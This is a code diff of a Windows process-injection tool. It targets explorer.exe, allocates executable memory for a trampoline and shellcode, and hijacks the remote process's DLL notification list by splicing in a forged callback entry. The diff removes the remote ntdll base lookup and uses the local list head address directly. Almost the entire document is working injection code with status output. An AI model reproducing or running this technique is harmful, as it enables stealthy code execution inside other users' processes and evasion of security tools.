@@ -50,60 +50,6 @@ DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMas
     return 0;
 }
 
-LPVOID GetNtdllBase(HANDLE hProc) {
-
-    // find NtQueryInformationProcess function
-    NtQueryInformationProcess pNtQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress((HMODULE)GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
-
-    // Get the PEB of the remote process
-    PROCESS_BASIC_INFORMATION info;
-    NTSTATUS status = pNtQueryInformationProcess(hProc, ProcessBasicInformation, &info, sizeof(info), 0);
-    ULONG_PTR ProcEnvBlk = (ULONG_PTR)info.PebBaseAddress;
-
-    // Read the address pointer of the remote Ldr
-    ULONG_PTR ldrAddress = 0;
-    BOOL res = ReadProcessMemory(hProc, ((char*)ProcEnvBlk + offsetof(_PEB, pLdr)), &ldrAddress, sizeof(ULONG_PTR), nullptr);
-
-    // Read the address of the remote InLoadOrderModuleList head
-    ULONG_PTR ModuleListAddress = 0;
-    res = ReadProcessMemory(hProc, ((char*)ldrAddress + offsetof(PEB_LDR_DATA, InLoadOrderModuleList)), &ModuleListAddress, sizeof(ULONG_PTR), nullptr);
-
-    // Read the first LDR_DATA_TABLE_ENTRY in the remote InLoadOrderModuleList
-    LDR_DATA_TABLE_ENTRY ModuleEntry = { 0 };
-    res = ReadProcessMemory(hProc, (LPCVOID)ModuleListAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr);
-
-    LIST_ENTRY* ModuleList = (LIST_ENTRY*)&ModuleEntry;
-    WCHAR name[1024];
-    ULONG_PTR nextModuleAddress = 0;
-
-    LPWSTR sModuleName = (LPWSTR)L"ntdll.dll";
-
-    // Start the forloop with reading the first LDR_DATA_TABLE_ENTRY in the remote InLoadOrderModuleList
-    for (ReadProcessMemory(hProc, (LPCVOID)ModuleListAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr);
-        // Stop when we reach the last entry
-        (ULONG_PTR)(ModuleList->Flink) != ModuleListAddress;
-        // Read the next entry in the list
-        ReadProcessMemory(hProc, (LPCVOID)nextModuleAddress, &ModuleEntry, sizeof(LDR_DATA_TABLE_ENTRY), nullptr))
-    {
-
-        // Zero out the buffer for the dll name
-        memset(name, 0, sizeof(name));
-
-        // Read the buffer of the remote BaseDllName UNICODE_STRING into the buffer "name"
-        ReadProcessMemory(hProc, (LPCVOID)ModuleEntry.BaseDllName.pBuffer, &name, ModuleEntry.BaseDllName.Length, nullptr);
-
-        // Check if the name of the current module is ntdll.dll and if so, return the DllBase address
-        if (wcscmp(name, sModuleName) == 0) {
-            return (LPVOID)ModuleEntry.DllBase;
-        }
-
-        // Otherwise, set the nextModuleAddress to point for the next entry in the list
-        ModuleList = (LIST_ENTRY*)&ModuleEntry;
-        nextModuleAddress = (ULONG_PTR)(ModuleList->Flink);
-    }
-    return 0;
-}
-
 // Our dummy callback function
 VOID DummyCallback(ULONG NotificationReason, const PLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context)
 {
@@ -197,28 +143,15 @@ unsigned char trampoline[] = { 0x56, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xe4, 0xf0, 0
 int main()
 {
     // Get local LdrpDllNotificationList head address
-    LPVOID localHeadAddress = (LPVOID)GetDllNotificationListHead();
-    printf("[+] Local LdrpDllNotificationList head address: 0x%p\n", localHeadAddress);
-
-    // Get local NTDLL base address
-    HANDLE hNtdll = GetModuleHandleA("NTDLL.dll");
-    printf("[+] Local NTDLL base address: 0x%p\n", hNtdll);
-
-    // Calculate the offset of LdrpDllNotificationList from NTDLL base
-    int offsetFromBase = (BYTE*)localHeadAddress - (BYTE*)hNtdll;
-    printf("[+] LdrpDllNotificationList offset from NTDLL base: 0x%X\n", offsetFromBase);
+    LPVOID headAddress = (LPVOID)GetDllNotificationListHead();
+    printf("[+] LdrpDllNotificationList head address: 0x%p\n", headAddress);
 
     // Open handle to remote process
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, FindTarget("explorer.exe"));
     printf("[+] Got handle to remote process\n");
 
-    // Get remote NTDLL base address
-    LPVOID remoteNtdllBase = GetNtdllBase(hProc);
-    LPVOID remoteHeadAddress = (BYTE*)remoteNtdllBase + offsetFromBase;
-    printf("[+] Remote LdrpDllNotificationList head address 0x%p\n", remoteHeadAddress);
-
     // Print the remote Dll Notification List
-    PrintDllNotificationList(hProc, remoteHeadAddress);
+    PrintDllNotificationList(hProc, headAddress);
 
     // Allocate memory for our trampoline + restore prologue + shellcode in the remote process
     LPVOID trampolineEx = VirtualAllocEx(hProc, 0, sizeof(restore) + sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -256,13 +189,13 @@ int main()
 
     // We want our new entry to be the first in the list 
     // so its List.Blink attribute should point to the head of the list
-    newEntry.List.Blink = (PLIST_ENTRY)remoteHeadAddress;
+    newEntry.List.Blink = (PLIST_ENTRY)headAddress;
 
     // Allocate memory buffer for LDR_DLL_NOTIFICATION_ENTRY
     BYTE* remoteHeadEntry = (BYTE*)malloc(sizeof(LDR_DLL_NOTIFICATION_ENTRY));
 
     // Read the head entry from the remote process
-    ReadProcessMemory(hProc, remoteHeadAddress, remoteHeadEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
+    ReadProcessMemory(hProc, headAddress, remoteHeadEntry, sizeof(LDR_DLL_NOTIFICATION_ENTRY), nullptr);
 
     // Set the new entry's List.Flink attribute to point to the original first entry in the list
     newEntry.List.Flink = ((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink;
@@ -277,7 +210,7 @@ int main()
 
     // Calculate the addresses we need to overwrite with our new entry's address
     // The previous entry's Flink (head) and the next entry's Blink (original 1st entry)
-    LPVOID previousEntryFlink = (LPVOID)((BYTE*)remoteHeadAddress + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Flink));
+    LPVOID previousEntryFlink = (LPVOID)((BYTE*)headAddress + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Flink));
     LPVOID nextEntryBlink = (LPVOID)((BYTE*)((PLDR_DLL_NOTIFICATION_ENTRY)remoteHeadEntry)->List.Flink + offsetof(LDR_DLL_NOTIFICATION_ENTRY, List) + offsetof(LIST_ENTRY, Blink));
 
     // buffer for the original values we are goind to overwrite
@@ -309,6 +242,6 @@ int main()
     printf("[+] Our new entry has been inserted.\n");
 
     // Print the remote Dll Notification List
-    PrintDllNotificationList(hProc, remoteHeadAddress);
+    PrintDllNotificationList(hProc, headAddress);
 
 }
